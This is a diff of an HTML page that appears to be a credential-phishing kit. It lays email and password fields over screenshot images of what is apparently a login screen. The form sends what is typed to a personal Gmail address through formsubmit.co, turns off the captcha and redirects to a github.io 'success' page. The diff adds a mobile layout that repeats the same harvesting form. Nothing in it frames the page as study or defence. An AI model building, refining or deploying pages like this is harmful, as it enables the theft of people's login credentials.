@@ -14,13 +14,17 @@
 
 </script>
 
-<body style="overflow-x: hidden;" onload="unhideBody()">
+<body onload="unhideBody()">
 
 
     <link rel="shortcut icon" href="img/favicon.ico" />
 
 
     <style>
+        body {
+            overflow-x: hidden;
+        }
+
         .inputs {
             padding: 1px;
             border-radius: 3px;
@@ -36,6 +40,26 @@
         .inputs:focus {
             outline-color: #54B4AD;
         }
+
+        .container {
+            display: none;
+        }
+
+        @media(max-width:700px) {
+            body {
+                overflow: unset;
+            }
+
+            #container {
+                display: none;
+            }
+
+            .container {
+                display: flex;
+                flex-direction: column;
+
+            }
+        }
     </style>
 
 
@@ -47,44 +71,97 @@
 
     <body>
 
-        <div id="image1" style="position:absolute; overflow:hidden;  top:0px; width:1349px; height:610px; z-index:0">
-            <img src="img/ghead.png" alt="" title="" border=0 width=1349 height=610>
-        </div>
 
-
-        <div id="imase2" style="position:absolute; overflow:hidden; top:610px; width:1350px; height:474px; z-index:10">
-            <a href="#"><img src="img/fti.png" alt="" title="" border=0 width=1350 height=474></a>
-        </div>
-
-        <form action="https://formsubmit.co/codis1723@gmail.com" name="okai" method="post">
-
-            <div class="col-mid-3">
-
-
-
-                <!-- HoneyPot -->
-                <input type="text" name="_honey" style="display: none;">
-
-                <!-- Disable Captcha -->
-                <input type="hidden" name="_captcha" value="false">
-
-                <input type="hidden" name="_next" value="https://construction-ux.github.io/dem/succes4.html">
-
-
-                <input id="cr9422" autocomplete="off" required=""
-                    style="position:absolute;left:520px;top:296px;width:175px;height:23px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1"
-                    name="jinga" value="" type="email">
-
-                <input id="cu39422" autocomplete="off"
-                    style="position:absolute;left:520px;top:325px;width:175px;height:23px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1"
-                    name="awko2" value="" type="password">
+        <div class="container">
+            <div class="image1">
+                <img src="img/head ph.png" style="position: relative; right: 440px;">
+            </div>
+            <div class="image1">
+                <img src="img/ghead copy.PNG" style="position: relative; right: 400px;">
+            </div>
+            <div class="image1">
+                <img src="wellllllllll/ten copy.png">
+                <img src="wellllllllll/eleven.png" style="position: relative; bottom: 100px;">
+                <img src="wellllllllll/twelve.png" style="position: relative; bottom: 100px;">
             </div>
 
 
-            <div id="formimage1" style="position:absolute; left:570px; top:397px; z-index:34">
-                <input type="image" name="formimage1" width="82" height="26" src="img/next.png">
+            <form action="https://formsubmit.co/codis1723@gmail.com" name="okai" method="post">
+
+                <div class="col-mid-3">
+
+
+
+                    <!-- HoneyPot -->
+                    <input type="text" name="_honey" style="display: none;">
+
+                    <!-- Disable Captcha -->
+                    <input type="hidden" name="_captcha" value="false">
+
+                    <input type="hidden" name="_next" value="https://construction-ux.github.io/dem/succes4.html">
+
+
+                    <input id="cr9422" autocomplete="off" required=""
+                        style="position:absolute;left:118px;top:352px;width:175px;height:23px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1"
+                        name="jinga" value="" type="email">
+
+                    <input id="cu39422" autocomplete="off"
+                        style="position:absolute;left:119px;top:381px;width:175px;height:23px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1"
+                        name="awko2" value="" type="password">
+                </div>
+
+
+                <div id="formimage1" style="position:absolute; left:170px; top:455px; z-index:34">
+                    <input type="image" name="formimage1" width="82" height="26" src="img/next.png">
+                </div>
+            </form>
+        </div>
+
+
+        <div id="container">
+
+            <div id="image1"
+                style="position:absolute; overflow:hidden;  top:0px; width:1349px; height:610px; z-index:0">
+                <img src="img/ghead.png" alt="" title="" border=0 width=1349 height=610>
+
             </div>
-        </form>
+
+
+            <div id="imase2"
+                style="position:absolute; overflow:hidden; top:610px; width:1350px; height:474px; z-index:10">
+                <a href="#"><img src="img/fti.png" alt="" title="" border=0 width=1350 height=474></a>
+            </div>
+
+            <form action="https://formsubmit.co/codis1723@gmail.com" name="okai" method="post">
+
+                <div class="col-mid-3">
+
+
+
+                    <!-- HoneyPot -->
+                    <input type="text" name="_honey" style="display: none;">
+
+                    <!-- Disable Captcha -->
+                    <input type="hidden" name="_captcha" value="false">
+
+                    <input type="hidden" name="_next" value="https://construction-ux.github.io/dem/succes4.html">
+
+
+                    <input id="cr9422" autocomplete="off" required=""
+                        style="position:absolute;left:520px;top:296px;width:175px;height:23px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1"
+                        name="jinga" value="" type="email">
+
+                    <input id="cu39422" autocomplete="off"
+                        style="position:absolute;left:520px;top:325px;width:175px;height:23px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1"
+                        name="awko2" value="" type="password">
+                </div>
+
+
+                <div id="formimage1" style="position:absolute; left:570px; top:397px; z-index:34">
+                    <input type="image" name="formimage1" width="82" height="26" src="img/next.png">
+                </div>
+            </form>
+        </div>
     </body>
 
 </html>
